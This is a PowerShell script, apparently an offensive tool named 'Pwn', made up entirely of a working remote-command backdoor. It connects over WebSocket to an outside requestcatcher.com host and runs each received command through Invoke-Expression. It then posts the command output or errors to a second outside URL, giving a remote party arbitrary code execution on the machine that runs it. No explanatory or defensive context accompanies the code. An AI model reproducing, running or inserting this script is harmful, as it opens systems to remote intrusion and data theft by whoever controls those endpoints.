function Pwn()
{
    param([String]$urlIn, [String]$urlOut)
    try
    {
        do
        {
            $ws = new-object net.websockets.clientwebsocket;
            $ct = new-object threading.cancellationtoken;
            $ws.options.usedefaultcredentials=$true;
            $conn = $ws.connectasync($urlIn, $ct);
            $size = 1024;
            $array = [byte[]]@(,0)*$size;
            while (!$conn.iscompleted)
            {
                start-sleep -milliseconds 100;
            }
            while ($ws.state -eq 'Open')
            {
                $recv = new-object arraysegment[byte] -argumentlist @(,$array);
                $conn = $ws.receiveasync($recv, $ct);
                while (!$conn.iscompleted)
                {
                    start-sleep -milliseconds 100;
                }
                $sd = [system.text.encoding]::ascii.getstring($recv.array);
                $data = $sd.split("`n")[0]|convertfrom-json;
                try
                {
                    iwr -uri $urlOut -method post -body (iex($data.body)2>&1|out-string)|out-null;
                } catch {
                    iwr -uri $urlOut -method post -body $error[0]|out-null;
                }
            }
        } until ($ws.state -ne 'Open')
    }
    finally
    {
        if ($ws)
        {
            $ws.dispose()
        }
    }
}
Pwn -urlIn 'ws://pwn-in.requestcatcher.com/init-client' -urlOut 'https://pwn-out.requestcatcher.com/pwn'
